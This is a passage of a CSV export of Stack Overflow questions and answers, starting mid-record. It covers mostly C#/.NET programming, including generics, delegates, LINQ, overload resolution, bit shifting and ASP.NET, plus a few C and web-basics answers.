        context.Response.Redirect(msgReturn.ToString());
    }
</code></pre>
","33708","","<p>You can generate JSON from your HTTP Handler and use <code>jquery.post</code> to submit form data and get results in the ColdFusion page.</p>
"
"<p>Given image file with no extension, how can I read the image file and identify the file format in C++?</p>
","33708","","<p>You can check the source of Linux <code>file</code> command (<code>git://git.debian.net/git/debian/file.git</code>). It does exactly the same thing; and not just for image files.</p>
"
"<p>I want to be able to compare two doubles disregarding a possible precision loss. Is there a method already that handles this case? </p>

<p>If not, is there a threshold/guideline to know how much is an adequate equivalence between two doubles?</p>
","33708","","<p>The threshold is completely dependent to the problem itself. For some problems, you might consider 1.001 equal to 1.002 and for some problems, you might need a much smaller threshold.</p>

<p>The general techique is:</p>

<pre><code>Math.Abs(a - b) &lt; some_epsilon    // `a` is roughly equivalent to `b`
</code></pre>
"
"<p>I'm using a third party library which returns a data reader. I would like a simple way and as generic as possible to convert it into a List of objects.<br />
For example, say I have a class 'Employee' with 2 properties EmployeeId and Name, I would like the data reader (which contains a list of employees) to be converted into List&lt; Employee>.<br />
I guess I have no choice but to iterate though the rows of the data reader and for each of them convert them into an Employee object that I will add to the List. Any better solution? I'm using C# 3.5 and ideally I would like it to be as generic as possible so that it works with any classes (the field names in the DataReader match the property names of the various objects).</p>
","33708","","<p>You could build an extension method like:</p>

<pre><code>public static List&lt;T&gt; ReadList&lt;T&gt;(this IDataReader reader, 
                                  Func&lt;IDataRecord, T&gt; generator) {
     var list = new List&lt;T&gt;();
     while (reader.Read())
         list.Add(generator(reader));
     return list;
}
</code></pre>

<p>and use it like:</p>

<pre><code>var employeeList = reader.ReadList(x =&gt; new Employee {
                                               Name = x.GetString(0),
                                               Age = x.GetInt32(1)
                                        });
</code></pre>

<p>Joel's suggestion is a good one. You can choose to return <code>IEnumerable&lt;T&gt;</code>. It's easy to transform the above code:</p>

<pre><code>public static IEnumerable&lt;T&gt; GetEnumerator&lt;T&gt;(this IDataReader reader, 
                                              Func&lt;IDataRecord, T&gt; generator) {
     while (reader.Read())
         yield return generator(reader);
}
</code></pre>

<p>If you want to automatically map the columns to properties, the code idea is the same. You can just replace the <code>generator</code> function in the above code with a function that interrogates <code>typeof(T)</code> and sets the properties on the object using reflection by reading the matched column. However, I personally prefer defining a factory method (like the one mentioned in Joel's answer) and passing a delegate of it into this function:</p>

<pre><code> var list = dataReader.GetEnumerator(Employee.Create).ToList();
</code></pre>
"
"<p>In ASP.NET C# I have a struct:</p>

<pre><code>public struct Data
{
    public int item1;
    public int item2;
    public int category_id;
    public string category_name;
}
</code></pre>

<p>and I have a List of those.  I want to select category_id and category_name, running a DISTINCT and finally an ORDERBY on category_name.</p>

<p>Here's what I have now:</p>

<pre><code>List&lt;Data&gt; listObject = getData();
string[] catNames = listObject
                    .Select(i=&gt; i.category_name)
                    .Distinct()
                    .OrderByDescending(s =&gt; s)
                    .ToArray();
</code></pre>

<p>This obviously just gets the category name.  My question is, how do I get multiple fields, and what data structure will I store this in (not a string[])?</p>

<p>EDIT</p>

<p>Using a list of structs is not set in stone.  If it would be advisable to change my backing data structure to make selects easier (I'll be writing a lot of these) then I'd gladly take recommendations.</p>
","33708","","<p>You could use an anonymous type:</p>

<pre><code>.Select(i =&gt; new { i.name, i.category_name })
</code></pre>

<p>The compiler will generate the code for a class with <code>name</code> and <code>category_name</code> properties and returns instances of that class. You can also manually specify property names:</p>

<pre><code>i =&gt; new { Id = i.category_id, Name = i.category_name }
</code></pre>

<p>You can have arbitrary number of properties.</p>
"
"<p>I want to learn C language (is this something good ?) and i didn't know from where i can download the language to my PC ?
and are this FREE or must pay for ?</p>
","33708","","<p>Is C a good language? Definitely. Is it the best <em>first</em> language? Depends. </p>

<p>If you are using Windows, you can <a href=""http://www.microsoft.com/express/vc/"" rel=""nofollow"">download Visual C++ 2008 Express Edition SP1</a> from Microsoft for free.</p>

<p>On Ubuntu, just run </p>

<pre><code>sudo apt-get install build-essential
</code></pre>

<p>On Mac OS X, install Xcode from Snow Leopard/Leopard DVD (or download the latest version from <a href=""http://developer.apple.com/technology/Xcode.html"" rel=""nofollow"">Apple developer Web site</a>)</p>
"
"<p>I have the following code:</p>

<pre><code>class myClass
{
private delegate string myDelegate(Object bj);

protected void method()
   {
   myDelegate build = delegate(Object bj)
                {
                    var letters= string.Empty;
                    if (someCondition)
                        return build(some_obj); //This line seems to choke the compiler
                    else string.Empty;

                };
   ......
   }
}
</code></pre>

<p>Is there another way to set up an anonymous method in C# such that it can call itself?</p>
","33708","","<p>You can break it down into two statements and use the magic of captured variables to achieve the recursion effect:</p>

<pre><code>myDelegate build = null;
build = delegate(Object bj)
        {
           var letters= string.Empty;
           if (someCondition)
               return build(some_obj);                            
           else string.Empty;
        };
</code></pre>
"
"<p>I have the following method: </p>

<pre><code>public TResult Get&lt;TGenericType, TResult&gt;() 
                          where TGenericType : SomeGenericType&lt;TResult&gt;
                          where TResult : IConvertible {
   //...code that uses TGenericType...
   //...code that sets someValue...
   return (TResult) someValue;
}
</code></pre>

<p>Right now, a user of this method has to use it like this: </p>

<pre><code>//notice the duplicate int type specification
int number = Get&lt;SomeGenericType&lt;int&gt;, int&gt;();
</code></pre>

<p>Why do I have to specify TResult in the method defintion? The compiler already knows TResult since I specified it in TGenericType. Ideally (if the C# compiler was a little smarter), my method would look like this:</p>

<pre><code>public TResult Get&lt;TGenericType&gt;() 
                          where TGenericType : SomeGenericType&lt;TResult&gt;
                          where TResult : IConvertible {
   //...code that uses TGenericType...
   //...code that sets someValue...
   return (TResult) someValue;
}
</code></pre>

<p>So the user could just simply use it like this:</p>

<pre><code>//much cleaner
int number = Get&lt;SomeGenericType&lt;int&gt;&gt;();
</code></pre>

<p><strong>Is there any way to do what I want to do?</strong></p>
","33708","","<p>C# specification does not allow inferring half of type arguments. You should either let the compiler to infer all the type arguments (which is not always applicable, like in your case) or manually specify all of them.</p>

<p><strong>UPDATE (reply to comment):</strong> While I'm not on the C# team to give an absolute answer to your question, my speculation is that the complexity of overload resolution (which is already mind-blowing; you know that if you read that section of C# spec) would increase significantly if they wanted to allow half of types to be inferred and half not (especially considering the fact that you can overload methods solely by the number of generic arguments).</p>
"
"<pre><code>Class A
{
  public:
    NullIt()
    {
      this = NULL;
    }

    Foo()
    {
      NullIt();
    }
}

A * a = new A;
a-&gt;Foo();

assert(a);  //should assert here
</code></pre>

<p>Is there a way to achieve this effect, memory leaks aside?</p>
","33708","","<p><code>this</code> is a constant pointer. You can change what it points to but you can't change the pointer itself.</p>

<p>As noted in comments, yes, you can cast the <code>const</code> away, but even if you change that, it's just a local variable. It won't affect the actual outside reference.</p>
"
"<p>From what I've read,</p>

<pre><code>yield return &lt;value&gt;
</code></pre>

<p>jumps out of the function the moment the line is executed. However, Scott Guthrie's text indicates that</p>

<pre><code>var errors = dinner.GetRuleViolations();
</code></pre>

<p>successfully pulls out a list of all the rule violations even though GetRuleViolations is a long list of</p>

<pre><code>if(String.someFunction(text))
    yield return new RuleViolation(""Scary message"");
if(String.anotherFunction(text))
    yield return new RuleViolation(""Another scary message"");
</code></pre>

<p>How does this work?</p>
","33708","","<p>It doesn't return a list. It returns an <code>IEnumerable&lt;RuleViolation&gt;</code>. <code>yield return</code> returns a value in an <a href=""http://msdn.microsoft.com/en-us/library/dscyy5s0%28VS.80%29.aspx"" rel=""nofollow"">iterator method</a>. An iterator is an easy way to generate a sequence of elements in a method. </p>
"
"<p>We used chilkatdotnet.dll to do this. The dll has a function called GetEmail(url) that will execute the url and return the html text that is rendered by the url. for example if we say GetEmail('www.stackoverflow.com') it will return the html text same as the one that we get when we click on view source. We are trying to implement the same functionality using .NET 2.0. </p>

<p>Please let me know if you have any ideas.</p>

<p>Thanks,
sridhar.</p>
","33708","","<p>Isn't this all you want?</p>

<pre><code>string s = new System.Net.WebClient().DownloadString(url);
</code></pre>
"
"<p>What is the best way to combine two uints into a ulong in c#, setting the high/low uints.</p>

<p>I know bitshifting can do it, but I don't know the syntax, or there maybe other APIs to help like BitConverter, but I don't see a method that does what I want.</p>
","33708","","<pre><code>ulong mixed = (ulong)high &lt;&lt; 32 | low;
</code></pre>

<p>The cast is very important. If you omit the cast, considering the fact that <code>high</code> is of type <code>uint</code> (which is 32 bits), you'll be shifting a 32 bit value 32 bits to the left. Shift operators on 32 bit variables will use shift stuff by <code>right-hand-side</code> mod 32. Effectively, <em>shifting a <code>uint</code> 32 bits to the left <strong>is a no-op</em></strong>. Casting to <code>ulong</code> prevents this.</p>

<p>Verifying this fact is easy:</p>

<pre><code>uint test = 1u;
Console.WriteLine(test &lt;&lt; 32); // prints 1
Console.WriteLine((ulong)test &lt;&lt; 32); // prints (ulong)uint.MaxValue + 1
</code></pre>
"
"<p>I've started reading Jon Skeet's early access version of his book, which contains sections on C# 4.0, and one thing struck me. Unfortunately I don't have Visual Studio 2010 available so I thought I'd just ask here instead and see if anyone knew the answer.</p>

<p>If I have the following code, a mixture of existing code, and new code:</p>

<pre><code>public void SomeMethod(Int32 x, Int32 y) { ... }

public void SomeMethod(Int32 x, Int32 y, Int32 z = 0) { ... }
</code></pre>

<p>Will the compiler complain either at the definition site or the call site about possible ambiguity?</p>

<p>For instance, what will this piece of code actually do?</p>

<pre><code>SomeClass sc = new SomeClass();
sc.SomeMethod(15, 23);
</code></pre>

<p>Will it compile? Will it call the one without the z parameter, or will it call the one with the z parameter?</p>
","33708","","<p>It will compile without warnings and will choose the first overload.</p>

<p>With the introduction of optional and named parameters, the overload resolution mechanism of C# has become really complicated. In this specific case, it makes sense however. As usual, the compiler will choose the most specific overload that matches the arguments. </p>

<p>I don't believe this specific case is much different from C# 1.0:</p>

<pre><code>public void SomeMethod(Int32 x, Int32 y) { } 
public void SomeMethod(Int32 x, Int32 y, params Int32[] z) { }
</code></pre>

<p>which works identically (in terms of overload resolution).</p>

<p><strong>Follow up answer:</strong> I don't think so. I'm afraid you'll have to manually specify the default argument in the method call. However, if <code>x</code> or <code>y</code> parameter had a different name like:</p>

<pre><code>public void SomeMethod(Int32 x, Int32 y) { } 
public void SomeMethod(Int32 t, Int32 y, Int32 z = 0) { }
</code></pre>

<p>you could choose the second overload with:</p>

<pre><code>obj.SomeMethod(t: 10, y: 20);
</code></pre>
"
"<p>Very often it happens that I have private methods which become very big and contain repeating tasks but these tasks are so specific that it doesn't make sense to make them available to any other code part.</p>

<p>So it would be really great to be able to create 'inner methods' in this case.</p>

<p>Is there any technical (or even phylosophical?) limitation that prevents C# from giving us this? Or did I miss something?</p>
","33708","","<p>Well, we can have ""anonymous methods"" defined inside a function (I don't suggest using them to organize a large method):</p>

<pre><code>void test() {
   Action t = () =&gt; Console.WriteLine(""hello world"");  // C# 3.0+
   // Action t = delegate { Console.WriteLine(""hello world""); }; // C# 2.0+
   t();
}
</code></pre>
"
"<p>I am just new to web programming and just curious to know abt Get and Post methods of sending data from one page to another page.</p>

<p>It is said that Get method is faster than Post but i don't know why is it
one reason i could find is that Get can take only 255 chars with it?
Is there any other reasons , please someone explain me?</p>
","33708","","<p>It's not much about speed. There are plenty of cases where POST is more applicable. For example, search engines will index GET URLs and browsers can bookmark them and make them show up in history. As a result, if you take actions like modifying a DB based on a GET request, it might be harmful as some bots might also traverse the URL. </p>

<p>The other case can be security issue. If you post credentials using GET, it'll get listed in browser history and server log files.</p>
"
"<p><img src=""http://img377.imageshack.us/img377/3469/86566498.png"" alt=""alt text"" /></p>

<p>Is this a list of lists or just a bunch of trees(forest)?</p>
","33708","","<p>Depends on what you want to do with it. <code>List&lt;LinkedListTree&gt;</code> might work in general case. If you need to represent disjoint sets (like Kruskal's MST algorithm) you might want to look at <a href=""http://en.wikipedia.org/wiki/Disjoint-set%5Fdata%5Fstructure"" rel=""nofollow"">another data structure</a>.</p>
"
"<p>I have two <code>IList&lt;ICat&gt;</code> and I'm trying to create a method which takes an <code>IList&lt;ICat&gt;</code> and does some work. I'm having problems trying to pass either an <code>IList&lt;PussyCat&gt;</code> or <code>IList&lt;OtherCat&gt;</code> to it, both <code>PussyCat</code> and <code>OtherCat</code> implement <code>ICat</code>.</p>

<p>I've tried:</p>

<pre><code>List&lt;PussyCat&gt; cats = ...
DoWork((IList&lt;ICat&gt;)cats);
</code></pre>

<p>and just</p>

<pre><code>DoWork(cats);
</code></pre>

<p>But neither compile. Any ideas?</p>
","33708","","<p>C# generics are invariant. It means <code>List&lt;string&gt;</code> is not a <code>List&lt;object&gt;</code>. </p>

<p>C# 4.0 introduces <a href=""http://community.bartdesmet.net/blogs/bart/archive/2009/04/13/c-4-0-feature-focus-part-4-generic-co-and-contra-variance-for-delegate-and-interface-types.aspx""><em>safe</em> covariance/contravariance</a> but still, you wouldn't be able to pass <code>List&lt;string&gt;</code> as <code>List&lt;object&gt;</code>. The reason is:</p>

<pre><code>List&lt;string&gt; x = new List&lt;string&gt;();
List&lt;object&gt; o = x; // assume this statement is valid
o.Add(5); // Adding an integer to a list of strings. Unsafe. Will throw.
</code></pre>

<p>Arrays, on the other hand are covariant. You can pass a <code>string[]</code> to a method that expects <code>object[]</code>.</p>
"
"<p>I have a winform application and a list of logins to some web-service. Upon checking 'remember me' I serialize a dictionary into a file along with the encrypted password, but I wonder if this is the best practice to do such a thing or not..
Here's my code </p>

<pre><code>public void LoginsInit()
{
  FileStream file = new FileStream(loginsFilePath, FileMode.OpenOrCreate);
  try
  {
    BinaryFormatter formatter = new BinaryFormatter();
    loginsDictionary = (Dictionary&lt;string, string&gt;)formatter.Deserialize(file);
    string[] allusers = loginsDictionary.Keys.ToArray();
    int usersCount = allusers.Length;
    userNameTextBox.Text = allusers[usersCount - 1];
  }
  catch (SerializationException ex)
  {
    loginsDictionary = new Dictionary&lt;string, string&gt;();
    Console.WriteLine(""Failed to open file: "" + ex.Message);
  }
  finally
  {
    file.Close();
  }
}

private void login_Click(object sender, EventArgs e)
{
  //LoginToService();
  string username;
  string password;
  username = serviceClientReference.UserLogin = userNameTextBox.Text;
  password = serviceClientReference.Password = EncryptDecrypt.Encrypt(this.passwordTextBox.Text, EncryptDecrypt.c_strEncryptkey1, EncryptDecrypt.c_strEncryptkey2);

  if (rememberMe.Checked)
  {
    if (loginsDictionary.ContainsKey(username))
      loginsDictionary[username] = password;
    else
      loginsDictionary.Add(username, password);
  }
  FileStream file = new FileStream(loginsFilePath, FileMode.Create);
  try
  {
    BinaryFormatter formatter = new BinaryFormatter();
    formatter.Serialize(file, loginsDictionary);
    file.Flush();
  }
  catch (SerializationException ex)
  {
    Console.WriteLine(""Failed to open file: "" + ex.Message);
  }
  finally
  {
    file.Close();
  }

  string errorStr;
  int errorNo;
  try
  {
    bool res = serviceClientReference.EstablishConnection(out errorStr, out errorNo);
    if (!res)
    {
      MessageBox.Show(errorStr);
    }
  }
  catch (Exception exception)
  {
    Logger.Log(TraceLevel.Error, """", exception);
    MessageBox.Show(""Fatal Error Unable to login to MU"");
  }
}

private void usernameTextBox_TextChanged(object sender, EventArgs e)
{
  if (loginsDictionary.ContainsKey(userNameTextBox.Text))
    passwordTextBox.Text = EncryptDecrypt.Decrypt(loginsDictionary[userNameTextBox.Text], EncryptDecrypt.c_strEncryptkey1, EncryptDecrypt.c_strEncryptkey2);
}
</code></pre>
","33708","","<p>You might want to consider using <a href=""http://blogs.msdn.com/shawnfa/archive/2004/05/05/126825.aspx"" rel=""nofollow"">DPAPI</a> to manage your keys.</p>
"
"<p>We are going to develop an ASP.NET website in 30 language.
What is the best solution for developing that site? which architecture to be used? </p>
","33708","","<p>I suggest storing UI properties in resource files (<code>.resx</code>) and have the <code>CurrentUICulture</code> to the specific language for each request:</p>

<pre><code>&lt;globalization culture=""auto"" uiCulture=""auto"" /&gt;
</code></pre>

<p>If your Web site is mostly content-oriented rather than a business oriented application that differs heavily based on the language, you might want to consider building separate set of pages for each language and redirect the user based on a cookie or profile property or <code>Request.UserLanguages</code>. It's not possible to give a general prescription for globalization problem. The best architecture differs significantly based on the nature of each individual project.</p>
"
"<p>I know the basics of mySQL and database normalization.</p>

<p>I am getting into Microsoft programming now and plan to do a large website using ASP.NET MVC. The level of complexity of the website is probably similar to StackOverflow and other database-intensive websites. Except mine won't expect so many visitors of course :)</p>

<p>I hear Entities is the way of the future and ASP.NET MVC tutorials seem to use entities a lot instead of linq to SQL. Also I read Entities are likely to support other databases which would be useful for me later on. </p>

<p>I was thinking of learning to use Entities and wondered if the Microsoft DB stack requires that you first learn SQL, and then ADO.NET, and then Entities... or if a single book on Entities should cover my needs? What would you tell a motivated person to study, given that I don't want to read 6 months of learning material before coding. I want to get started soon but I don't want to misuse a database in a risky manner (security wise).</p>

<p>If Entities are overkill or too complicated, I could also study ADO.NET or whatever is a bit higher level than just inlining SQL queries in my code. I'm open to suggestions that work with MVC!</p>
","33708","","<p>Well, learning good stuff never hurts but if you want to get started and you want to use SQL Server as your DB, go with LINQ to SQL. LINQ to Entities is more complicated than LINQ to SQL and is designed to make the database tier transparent. It's more useful when you need your application to work seamlessly on plenty of DB engines.</p>

<p>By the way, before you ask, ""no, LINQ to SQL is not dead.""</p>
"
"<pre><code>Public Class FooBar
{
    private int _foo;

    public int Foo { 
        get { return _foo; }
        set { _foo = value; }
    }

    public void DoStuff()
    {
        _foo++; // Do this?
        Foo++; // Or this?
    }
}
</code></pre>

<p>Is there a more accepted practice to either access fields or properties (if one exists) in a class? I've always been in the habit of accessing the field, but since I've been doing WPF which has a lot of INotifyPropertyChanged, I've found myself needing to access the Property to get the notification changed. So now I have a mix of both field and property accesses throughout my classes and while from a compiler point-of-view it doesn't matter, stylistically and readability, it feels...awkward.</p>
","33708","","<p>There are certainly cases that accessing the property doesn't make sense (for example, if you were implementing the property itself). Putting those cases aside, I'd go with property style by default (unless I have a specific reason not to). Accessing the field through the property will direct all the changes into a single code path making changing the implementation and debugging easier and can be less error-prone.</p>
"
"<p>In c# i could do it like:</p>

<p>send.Write((ushort)9);</p>

<p>""send"" is an instance of BinaryWriter, how can i do it in vb.net ? I've tried it like:</p>

<p>send.Write((UShort)9)</p>

<p>but i get ""UShort is a type and cannot be used as an expression""</p>

<p>Thanks!</p>
","33708","","<p>This will work on all versions of VB.NET:</p>

<pre><code>send.Write(CType(9, System.UInt16))
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/426609/how-to-assign-profile-values"">How to assign Profile values?</a>  </p>
</blockquote>



<p>I'm using ASP.NET MVC and the Membership providers. How do I get the profile of a user in a view? any particular method to get it?</p>

<p>The template project out of the box access the username in this way:</p>

<pre><code>&lt;%= Html.Encode(Page.User.Identity.Name) %&gt;
</code></pre>

<p>I'd like to have a similar way to access the profile data.</p>
","33708","","<p>In MVC, you shouldn't access the profile directly in the view. You should fill a model object with <a href=""http://stackoverflow.com/questions/426609/asp-net-mvc-membership-how-to-assign-profile-values"">values of the user profile in the controller</a> and use the view to render those values.</p>
"
"<p>I am very surprised to see <code>HttpWebRequest</code> has no close method, but its counter-part <code>HttpWebResponse</code> has. It makes me a little bit confused and inconvenient. :-)</p>

<p>So, we only need to call Close on response and no need to treat with request? My concern is about leaks and better resource usage efficiency. I am using VSTS2008 + C# + .Net 3.5.</p>
","33708","","<p>Yes, you just need to call it on the response object.</p>

<p>A request does absolutely nothing on its own. It doesn't open up a socket or something. It just holds some data and you can just ignore it and throw it away if you don't need it (it's a pure managed resource and garbage collector will take care of it). Actual stuff happens after one of the <code>GetResponse</code> methods is called.</p>
"
"<p>When i store a delegate (that points to a page method) in session state, retrive it after a postback and execute it the target of the delegate is the old page object and not the current one, is there anyway to change the target of the delegate so that it executes the method on the current page object ?</p>

<p>I have thought about using a static page method but then i don't have access to the controls on the page which defeats the object of what i am trying to do, which is update a text box.</p>
","33708","","<pre><code>delegateInstance.Method.Invoke(obj, arguments);
</code></pre>
"
"<p>I am using Linq to Sql with Predicate Builder and am trying to optimize how much information is retrieved from the database.  I would like to select only certain fields to display them in a gridview.  When I select only what I want, the search parameters I add (see below) don't work, and neither does PredicateBuilder.  Here's what I'm currently doing (that works, but gets EVERYTHING which is way too much info)</p>

<pre><code>    ' Initial Setup '
    Dim db As New MyDataContext()
    Dim results = From p In db.Products _
                  Select p

    ' Search '
    If (testCase) Then
        results = results.Where(Function(p) p.SomeAttribute = 123)
    End If
</code></pre>

<p>If I change that to only select what I need, like this:</p>

<pre><code>    Dim results = From p In db.Products _
                  Select p.Name, p.SomethingElse
</code></pre>

<p>then I've noticed if the information is selected (ie I select p.SomeAttribute) then I can search (add the where clause) on that attribute, but if its not, I can't.  And with predicate builder it only works if I select the entire item (ie select p).  All this should be doing is creating SQL statements which don't have to select the attribute to search by it.  How can I get this to work and select only what I need, but search by anything and keep prediate builder working?  Any help MUCH APPRECIATED!  Thanks</p>
","33708","","<p>You can't modify the ""select list"" (this is how I understood your question. I might have misunderstood it) with predicate builder (which builds boolean expressions). You should manually use stuff in <code>System.Linq.Expressions</code> namespace to do that but I suggest using <a href=""http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx"" rel=""nofollow"">Dynamic LINQ</a> instead.</p>
"
"<p>I can declare a structure:<br></p>

<pre><code>typedef struct
{
  int var1;
  int var2;
  int var3;
} test_t;
</code></pre>

<p>Then create an array of those structs structure with default values:</p>

<pre><code>test_t theTest[2] =
{
   {1,2,3},
   {4,5,6}
};
</code></pre>

<p>But after I've created the array, is there any way to change the values in the same way I did above, using only one line, specifying every value explicitly without a loop?</p>
","33708","","<p>In case you want to set the values to zero (or -1), you can use <code>memset</code>:</p>

<pre><code>memset(struct_array, 0, sizeof(struct_array));
memset(struct_array, -1, sizeof(struct_array));
</code></pre>
"
"<p>According to the question: <a href=""http://stackoverflow.com/questions/1223660/is-c-code-faster-than-visual-basic-net-code"">Is C# code faster than Visual Basic.NET code</a>?
Was said that C# and VB.NET generates the same CLR code at the end.</p>

<p>But in the case when I'm using codebehind and inline code, are there different performance (ignoring the language used)?</p>
","33708","","<p>Inline code <em>can</em> require compilation the first time the request is made. After that (or if it's precompiled), there's absolutely zero difference between them.</p>

<p>By the way, even if it requires compilation, the speed difference should be insignificant as ASP.NET will have to compile a source file anyway. The difference will come down to a adding a few lines of code in a large source file!</p>
"
"<p>Say you have the following function:</p>

<pre><code>char *getp()
{
    char s[] = ""hello"";
    return s;
}
</code></pre>

<p>Since the function is returning a pointer to a local variable in the function to be used outside, will it cause a memory leak?</p>

<p><em>P.S. I am still learning C so my question may be a bit naive...</em></p>

<p><strong>[Update]</strong><br/>
So, if say you want to return a new <code>char[]</code> array (ie maybe for a substring function), what do you return exactly? Should it be pointer to an external variable ?  ie a <code>char[]</code> that is not local to the function?</p>
","33708","","<p>It won't cause a memory leak. It'll cause a dangling reference. The local variable is allocated on the stack and will be freed as soon as it goes out of scope. As a result, when the function ends, the pointer you are returning no longer points to a memory you own. This is not a memory leak (memory leak is when you allocate some memory and don't free it). </p>

<p><strong>[Update]</strong>:
To be able to return an array allocated in a function, you should allocate it outside stack (e.g. in the heap) like:</p>

<pre><code>char *test() {
    char* arr = malloc(100);
    arr[0] = 'M';
    return arr;
}
</code></pre>

<p>Now, if you don't <code>free</code> the memory in the calling function after you finished using it, you'll have a memory leak.</p>
"
"<p>having a FileStream that I read with a StreamReader (it is a very large file), how can I set the Seek position of the FileStream to the first occurrence of a certain substring so that I can start reading this large file from a given point?</p>

<p>Thanks</p>
","33708","","<p><code>FileStream</code> cannot do the search for you. You'll have to manually search for it. Probably you'll want to use an efficient string searching algorithm such as <a href=""http://en.wikipedia.org/wiki/Knuth-Morris-Pratt%5Falgorithm"" rel=""nofollow"">Knuth Morris Pratt</a>.</p>
"
"<p>What is considered best practice for executing recurring SQL queries?  My understanding is to use a parameterized query and turn it into a prepared statement upon first execution.  What if this query needs to be executed by multiple threads?  Will I need to create a prepared statement for each type of query for each thread?
Or is the parsing of SQL statements so efficient nowadays that prepared statements are no longer necessary?</p>
","33708","","<p>Well, you didn't mention the environment you're using but in general, you can also consider stored procedures (if your DB engine supports it). It has the benefit of building an additional abstraction layer in the database itself thus making the exact database schema less relevant to client applications. </p>

<p>Using parameterized queries is encouraged most of the time, not only for the sake of performance, but for the security against SQL injection and preventing data type conversion issues (localized date time).</p>
"
"<p>I am calling a stored procedure from my application that can take 30 minutes to execute.</p>

<p>I don't want to make my user leave the application open for that entire time period. So I would like to call the sproc, let it fly, and let them shut down the application and come back later. </p>

<p>How can I do this?  </p>
","33708","","<p>You can use the <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.beginexecutenonquery.aspx"" rel=""nofollow""><code>BeginExecuteXXX</code>/<code>EndExecuteXXX</code></a> methods (depending whether it returns a result or not) of the <code>SqlCommand</code>, passing a callback delegate. </p>
"
"<p>I've been using a linux machine for less than two weeks, so I am extremely new to Linux. </p>

<p>I'd also like to install the Java Developers Kit.  How should this be done?  Is there an <code>apt-get</code> command, or should I just click on the download button at Sun's website?</p>

<p>I'm sure there is more than one way to do this, and it probably doesn't matter much, but I was impressed with how smoothly <code>apt-get install</code> worked when installing PHP and MySQL, so if there is a <i>right</i> way to do this, I'd like to know.</p>

<p>I'm using Ubuntu version 9.04</p>
","33708","","<p>Yes, definitely it's the suggested way to install JDK on your Linux system (if available). </p>

<p>On Ubuntu:</p>

<pre><code>sudo apt-get install sun-java6-jdk
</code></pre>
"
"<p>After deploying an ASP.Net application to a new server, the first user to hit the app gets a long pause, presumably because the app is performing its initial compilation.  However, this pause seems to also also occur after the application has timed out and unloaded itself from memory.</p>

<p>The first compilation would be tolerable as it only happpens once, but the 2nd one seems to me like it should be unnecessary....is there a workaround to address this issue?  It would be nice to be able to extend the application timeout, but I only see a way to extend the session timeout, which I would rather not do, as this would keep all user sessions in memory for a long period of time.</p>
","33708","","<p>A common way (though looks hackish to me) to keep the worker process alive is to have some program issue web requests to some URL in the application on a regular basis.</p>

<p>You can reduce the initial startup time by precompiling the ASP.NET app with <a href=""http://msdn.microsoft.com/en-us/library/ms229863%28VS.80%29.aspx"" rel=""nofollow"">aspnet_compiler.exe</a>. This won't reduce the initial request time to zero (it'll still need to create the worker process and do other housekeeping.) but it'll noticeably reduce it.</p>
"
"<p>I was refactoring some code in a web application today and came across something like this in the base class for all webpages:</p>

<pre><code>if (Request.QueryString[""IgnoreValidation""] != null)
{
    if (Request.QueryString[""IgnoreValidation""].ToUpper() == ""TRUE"")
    {
        SessionData.IgnoreValidation = true;
    }
}
</code></pre>

<p>To me, this appears to be a Very Bad Thingâ¢, so I instantly removed all traces of this flag from the code.  For one, there were several if statements littered throughout that checked the value of the flag, leading to cluttered and unclear logic.  Secondly, I came across another, more dangerous flag named ""IgnoreCreditCardValidation"".  You can guess what that one did...</p>

<p>I then got to thinking about it and remembered a similar example from a previous job. In the code of an app sold as a ""secure authentication module"" there was a QueryString parameter used to override the default behavior, effectively allowing anyone with knowledge of it to bypass authentication.</p>

<p>Now my question is more of a confirmation, is this practice as bad as it seems in my head or am I just overreacting and this is commonplace?  Are there any cases where there would be a valid reason to do this?  To me it just seems like an awful mix of laziness and carelessness.</p>

<p>If this is a duplicate, please feel free to point me in the right direction.</p>

<p>Thanks!</p>
","33708","","<p>I agree with you. Especially if the module is designed to enforce security, this is a stupid thing to have in a <strong>release build</strong> (it's not a good idea to have in debug builds either, but that might be reasonable.) It's essentially security-by-obscurity.</p>
"
"<p>Is there an easy way to serialize a C# structure and then deserialize it from c++.
I know that we can serialize csharp structure to xml data, but I would have to implement xml deserializer in c++.</p>

<p>what kind of serializer in C# would be the easiest one to deserialize from c++?
I wanted two applications (one C++ and another csharp ) to be able to communicate using structures of data</p>
","33708","","<p>Try <a href=""http://code.google.com/p/protobuf/"" rel=""nofollow"">Google Protocol Buffers</a>. There are a bunch of <a href=""http://code.google.com/p/protobuf-net/"" rel=""nofollow"">.NET</a> <a href=""http://code.google.com/p/protobuf-csharp-port/"" rel=""nofollow"">implementations</a> of it.</p>
"
"<p>I'm trying to load an xml from a url in C#, but the problem is that, there is an xsl attached to the xml file, which means that I don't get the content of the xml file, but the html that it's transformed to using the xsl.</p>

<p>Is there any way to load the xml without first transforming it, so I just get the content of the xml?</p>
","33708","","<p>If the server transforms the file prior to serving it, then no, you can only get the transformed version. However, if it only specifies a processing instruction that refers an XSL stylesheet and the browser transforms it, you get the XML by default.</p>
"
"<p>I've found loads of practical examples of this, and understand the practical output when overriding or hiding methods, but I'm looking for some under the covers info on why this is and why C# allows it when according to the rules of polymorphism, this shouldn't be allowed - at least, insofar as my understanding of polymorphism goes (which seems to coincide with the standard definitions found on Wikipedia/Webopedia).</p>

<pre><code>Class Base
{
    public virtual void PrintName()
    {
        Console.WriteLine(""BaseClass"");
    }
}

Class FirstDerived : Base
{
    public override void PrintName()
    {
        Console.WriteLine(""FirstDerived"");
    }
}

Class SecondDerived : Base
{
    public new void PrintName()
    {
        Console.WriteLine(""SecondDerived"");
    }
}
</code></pre>

<p>Using the following code:</p>

<pre><code>FirstDerived b = new FirstDerived();
BaseClass a = b;
b.PrintName();
a.PrintName();
</code></pre>

<p>I get:</p>

<p>FirstDerived
FirstDerived</p>

<p>Okay, I get that, makes sense.</p>

<pre><code>SecondDerived c = new SecondDerived();
BaseClass a = c;
c.PrintName();
a.PrintName();
</code></pre>

<p>I get:</p>

<pre><code>SecondDerived 
BaseClass
</code></pre>

<p>Okay, that makes sense, too, instance a can't see c.PrintName() so it's using its own method to print its own name, however I can cast my instance to its true type using:</p>

<pre><code>((SecondDerived)a).PrintName();
</code></pre>

<p>or</p>

<pre><code>(a as SecondDerived).PrintName();
</code></pre>

<p>to get the output I would expect:</p>

<pre><code>SecondDerived
</code></pre>

